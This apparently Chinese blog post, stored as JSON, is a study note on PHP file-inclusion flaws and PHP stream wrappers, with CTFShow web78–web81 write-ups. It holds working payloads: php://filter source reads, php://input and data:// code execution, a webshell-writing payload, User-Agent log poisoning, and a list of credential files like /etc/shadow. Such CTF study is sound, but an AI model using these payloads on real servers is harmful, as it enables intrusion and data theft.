{"title":"","uid":"f73a8e23e6f6f669cf99c7dba8fa0722","slug":"PHP伪协议","date":"2022-11-25T07:32:45.425Z","updated":"2022-11-25T07:35:57.530Z","comments":true,"path":"api/articles/PHP伪协议.json","keywords":null,"cover":[],"content":"<h1 id=\"文件包含\"><a href=\"#文件包含\" class=\"headerlink\" title=\"文件包含\"></a>文件包含</h1><p>PHP包含函数：</p>\n<pre><code>include()：如果包含文件未找到会显示警告，脚本继续执行；\ninclude_once()：包含过的文件不再包含，包含文件未找到会显示警告，脚本继续执行；\nrequire()：包含文件未找到会产生致命错误，脚本终止；\nrequire_once()：包含过的文件不再包含，包含文件未找到会产生致命错误，脚本终止。\n</code></pre>\n<p>敏感文件</p>\n<p>敏感文件</p>\n<pre><code>Linux/Unix系统\n/etc/passwd                                                                 //  账户信息\n/etc/shadow                                                                 //  账户密码文件\n/usr/local/app/apache2/conf/httpd.conf                       //   Apache2默认配置文件\n/usr/local/app/apache2/conf/extra/httpd-vhost.conf    //   虚拟网站配置\n/usr/local/app/php5/lib/php.ini                                     //   PHP相关配置\n/etc/httpd/conf/httpd.conf                                            //   Apache配置文件\n/etc/my.conf                                                                 //   mysql 配置文件\n</code></pre>\n<h1 id=\"PHP伪协议\"><a href=\"#PHP伪协议\" class=\"headerlink\" title=\"PHP伪协议\"></a>PHP伪协议</h1><p><a href=\"https://segmentfault.com/a/1190000018991087\">php - PHP伪协议总结_个人文章 - SegmentFault 思否</a></p>\n<h2 id=\"file-x2F-x2F\"><a href=\"#file-x2F-x2F\" class=\"headerlink\" title=\"file://\"></a>file://</h2><p><strong>条件</strong></p>\n<pre><code>allow_url_fopen:off/on\nallow_url_include :off/on\n</code></pre>\n<p><strong>作用</strong></p>\n<p>用于访问本地文件系统，在CTF中通常用来<strong>读取本地文件</strong>的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。<br><code>include()/require()/include_once()/require_once()</code>参数可控的情况下，如导入为非<code>.php</code>文件，则仍按照php语法进行解析，这是<code>include()</code>函数所决定的。</p>\n<p><strong>说明</strong></p>\n<p><code>file://</code> 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以/、、\\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 <code>fopen()</code> 和 <code>file_get_contents()</code>，<code>include_path </code>会可选地搜索，也作为相对的路径。</p>\n<p><strong>用法</strong></p>\n<pre><code>/path/to/file.ext\nrelative/path/to/file.ext\nfileInCwd.ext\nC:/path/to/winfile.ext\nC:\\path\\to\\winfile.ext\n\\\\smbserver\\share\\path\\to\\winfile.ext\nfile:///path/to/file.ext\n</code></pre>\n<p><strong>ex</strong></p>\n<ol>\n<li><p>file://[文件的绝对路径和文件名]</p>\n<pre><code>http://127.0.0.1/include.php?file=file://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.txt\n</code></pre>\n</li>\n<li><p>[文件的相对路径和文件名]</p>\n<pre><code>http://127.0.0.1/include.php?file=./phpinfo.txt\n</code></pre>\n</li>\n<li><p>[http：//网络路径和文件名]</p>\n<pre><code>http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt\n</code></pre>\n</li>\n</ol>\n<h2 id=\"php-x2F-x2F\"><a href=\"#php-x2F-x2F\" class=\"headerlink\" title=\"php://\"></a>php://</h2><ul>\n<li><strong>条件</strong>：<ul>\n<li><code>allow_url_fopen</code>:off/on</li>\n<li><code>allow_url_include</code> :仅<code>php://input php://stdin php://memory php://temp </code>需要on</li>\n</ul>\n</li>\n<li><strong>作用</strong>：<br><code>php://</code> 访问各个输入/输出流（I/O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于<strong>执行php代码</strong>。</li>\n<li><strong>说明</strong>：<br>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</li>\n</ul>\n<p><img src=\"D:\\Documents\\PHP伪协议.assets\\image-20221007195919256.png\" alt=\"image-20221007195919256\"></p>\n<h3 id=\"php-x2F-x2F-filter\"><a href=\"#php-x2F-x2F-filter\" class=\"headerlink\" title=\"php://filter\"></a>php://filter</h3><p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：</p>\n<p><img src=\"D:\\Documents\\PHP伪协议.assets\\image-20221007200056447.png\" alt=\"image-20221007200056447\"></p>\n<p><strong>可用的过滤器列表</strong></p>\n<p><img src=\"D:\\Documents\\PHP伪协议.assets\\image-20221007200215446.png\" alt=\"image-20221007200215446\"></p>\n<p><strong>ex</strong></p>\n<p><code>php://filter/read=convert.base64-encode/resource=[文件名]</code>读取文件源码（针对php文件需要base64编码）</p>\n<pre><code>http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php\n</code></pre>\n<p><code>php://input + [POST DATA]</code>执行php代码</p>\n<pre><code>http://127.0.0.1/include.php?file=php://input\n[POST DATA部分]\n&lt;?php phpinfo(); ?&gt;\n</code></pre>\n<p>若有写入权限，写入一句话木马</p>\n<pre><code class=\"php\">http://127.0.0.1/include.php?file=php://input\n[POST DATA部分]\n&lt;?php fputs(fopen('1juhua.php','w'),'&lt;?php @eval($_GET[cmd]); ?&gt;'); ?&gt;\n</code></pre>\n<h1 id=\"CTFShow\"><a href=\"#CTFShow\" class=\"headerlink\" title=\"CTFShow\"></a>CTFShow</h1><h2 id=\"web78\"><a href=\"#web78\" class=\"headerlink\" title=\"web78\"></a>web78</h2><pre><code>if(isset($_GET['file'])){\n    $file = $_GET['file'];\n    include($file);\n}else{\n    highlight_file(__FILE__);\n}\n</code></pre>\n<p>无过滤，直接include</p>\n<pre><code>?file=php://filter/convert.base64-encode/resource=flag.php\n</code></pre>\n<p>bp抓包，给file传参?file=php://input然后在post输出想要执行的代码</p>\n<p><img src=\"D:\\Documents\\PHP伪协议.assets\\image-20221007204815967.png\" alt=\"image-20221007204815967\"></p>\n<h2 id=\"web79\"><a href=\"#web79\" class=\"headerlink\" title=\"web79\"></a>web79</h2><pre><code>if(isset($_GET['file'])){\n    $file = $_GET['file'];\n    $file = str_replace(\"php\", \"???\", $file);\n    include($file);\n}else{\n    highlight_file(__FILE__);\n}\n</code></pre>\n<p>相对于上一题，$file中的php转换了？？？即过滤了php，所以php协议不能用了</p>\n<pre><code>str_replace区分大小写\nstr_ireplace不区分\n</code></pre>\n<ol>\n<li><p>所以可以使用大小写绕过</p>\n<p><img src=\"D:\\Documents\\PHP伪协议.assets\\image-20221007205115202.png\" alt=\"image-20221007205115202\"></p>\n</li>\n<li><p>data协议</p>\n<pre><code>php5.2.0起，数据流封装器开始有效，主要用于数据流的读取。如果传入的数据是PHP代码，就会执行代码 \n</code></pre>\n<pre><code>payload：?file=data://text/plain,&lt;?= system('tac flag.???');?&gt;\n逗号后面是要执行的php代码\n或者\npayload：?file=data://text/plain;base64,PD89IHN5c3RlbSgndGFjIGZsYWcuPz8/Jyk7Pz4=\n逗号后面是要执行的php代码的base64加密形式\n \n注：data://可以用data:代替\n</code></pre>\n</li>\n</ol>\n<h2 id=\"web80\"><a href=\"#web80\" class=\"headerlink\" title=\"web80\"></a>web80</h2><p>过滤了php和data</p>\n<pre><code>if(isset($_GET['file'])){\n    $file = $_GET['file'];\n    $file = str_replace(\"php\", \"???\", $file);\n    $file = str_replace(\"data\", \"???\", $file);\n    include($file);\n}else{\n    highlight_file(__FILE__);\n}\n</code></pre>\n<ol>\n<li><p>使用大小写绕过，先ls查看文件名再查看flag</p>\n<p><img src=\"D:\\Documents\\PHP伪协议.assets\\image-20221007205744562.png\" alt=\"image-20221007205744562\"></p>\n</li>\n<li><p>日志文件包含</p>\n</li>\n</ol>\n<h1 id=\"日志文件包含\"><a href=\"#日志文件包含\" class=\"headerlink\" title=\"日志文件包含\"></a>日志文件包含</h1><p>伪造UA写入php代码</p>\n<pre><code>日志文件记录了服务器收到的每一次请求的\nIP、访问时间、URL、User-Agent，这4项中的前两项的值都是我们无法控制的，我们只能在自己可以控制的字段上做手脚，其中URL字段由于URL编码的存在，空格等一些符号会自动进行url编码，存到日志当中时，不是一个正确的php语句，无法成功执行，而User-Agent则不会被进行任何二次处理，我们发什么内容，服务器就将其原封不动的写入日志。\n\n访问日志的位置和文件名在不同的系统上会有所差异\n\napache一般是/var/log/apache/access.log\n\napache2一般是/var/log/apache2/access.log\n\nnginx的log在/var/log/nginx/access.log和/var/log/nginx/error.log\n</code></pre>\n<p>这个Linux的nginx日志文件路径是/var/log/nginx/access.log，要在用文件包含漏洞读取日志文件的同时，修改ua头为我们想要执行的命令(burp中go要点两次才能执行命令，第一次将代码写入日志，第二次执行代码</p>\n<p>且操作一定不能出问题，如果报错就要销毁容器从头再来 </p>\n<p>因为php语法错误后不再解释执行后面代码，语法错误后，后面不管语法对不对都不执行了。我们包含了日志文件，如果日志文件中我们插入了错误的php代码，那么我们再次执行对的代码时会先执行那个错误的php代码，因为报错，所以后面正确的就不会执行了。</p>\n<pre><code>?file=/var/log/nginx/access.log&amp;1=ls HTTP/1.1\n</code></pre>\n<p><img src=\"D:\\Documents\\PHP伪协议.assets\\image-20221007213352563.png\" alt=\"image-20221007213352563\"></p>\n<pre><code>?file=/var/log/nginx/access.log&amp;1=cat%20fl0g.php\n</code></pre>\n<p><img src=\"D:\\Documents\\PHP伪协议.assets\\image-20221007213245140.png\" alt=\"image-20221007213245140\"></p>\n<h2 id=\"web81\"><a href=\"#web81\" class=\"headerlink\" title=\"web81\"></a>web81</h2><p>因为过滤了冒号，所以远程文件包含和大小写绕过不行了，只能用日志包含</p>\n<pre><code>if(isset($_GET['file'])){\n    $file = $_GET['file'];\n    $file = str_replace(\"php\", \"???\", $file);\n    $file = str_replace(\"data\", \"???\", $file);\n    $file = str_replace(\":\", \"???\", $file);\n    include($file);\n}else{\n    highlight_file(__FILE__);\n}\n</code></pre>\n<p><img src=\"D:\\Documents\\PHP伪协议.assets\\image-20221007214346158.png\" alt=\"image-20221007214346158\"></p>\n<h2 id=\"web82\"><a href=\"#web82\" class=\"headerlink\" title=\"web82\"></a>web82</h2>","text":"文件包含PHP包含函数： include()：如果包含文件未找到会显示警告，脚本继续执行； include_once()：包含过的文件不再包含，包含文件未找到会显示警告，脚本继续执行； require()：包含文件未找到会产生致命错误，脚本终止； require_once()：包...","link":"","photos":[],"count_time":{"symbolsCount":"4.6k","symbolsTime":"4 mins."},"categories":[],"tags":[],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB\"><span class=\"toc-text\">文件包含</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\">PHP伪协议</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#file-x2F-x2F\"><span class=\"toc-text\">file:&#x2F;&#x2F;</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#php-x2F-x2F\"><span class=\"toc-text\">php:&#x2F;&#x2F;</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#php-x2F-x2F-filter\"><span class=\"toc-text\">php:&#x2F;&#x2F;filter</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#CTFShow\"><span class=\"toc-text\">CTFShow</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web78\"><span class=\"toc-text\">web78</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web79\"><span class=\"toc-text\">web79</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web80\"><span class=\"toc-text\">web80</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB\"><span class=\"toc-text\">日志文件包含</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web81\"><span class=\"toc-text\">web81</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web82\"><span class=\"toc-text\">web82</span></a></li></ol></li></ol>","author":{"name":"Yum1","slug":"blog-author","avatar":"https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/IMG_5282(20220929-023350).JPG","link":"/","description":"开卷","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"","uid":"f73a8e23e6f6f669cf99c7dba8fa0722","slug":"SQLI-LABS","date":"2022-11-25T07:32:45.427Z","updated":"2022-11-25T07:35:57.532Z","comments":true,"path":"api/articles/SQLI-LABS.json","keywords":null,"cover":[],"text":"Less-1判断是否存在注入: ?id=1' and 1=1 --+ 判断字段数: ?id=1' order by 3--+ 判断显错位: ?id=-1' union select 1,2,3--+ 判断库名: ?id=-1' union select 1,database(),...","link":"","photos":[],"count_time":{"symbolsCount":"11k","symbolsTime":"10 mins."},"categories":[],"tags":[],"author":{"name":"Yum1","slug":"blog-author","avatar":"https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/IMG_5282(20220929-023350).JPG","link":"/","description":"开卷","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"","uid":"f73a8e23e6f6f669cf99c7dba8fa0722","slug":"PHP特性","date":"2022-11-25T07:32:45.423Z","updated":"2022-11-25T07:35:57.532Z","comments":true,"path":"api/articles/PHP特性.json","keywords":null,"cover":[],"text":"PHP特性web89利用数组进行绕过 include(\"flag.php\"); highlight_file(__FILE__); if(isset($_GET['num'])){ $num = $_GET['num']; if(preg_match(\"/[0-9]/\", $nu...","link":"","photos":[],"count_time":{"symbolsCount":"26k","symbolsTime":"23 mins."},"categories":[],"tags":[],"author":{"name":"Yum1","slug":"blog-author","avatar":"https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/IMG_5282(20220929-023350).JPG","link":"/","description":"开卷","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}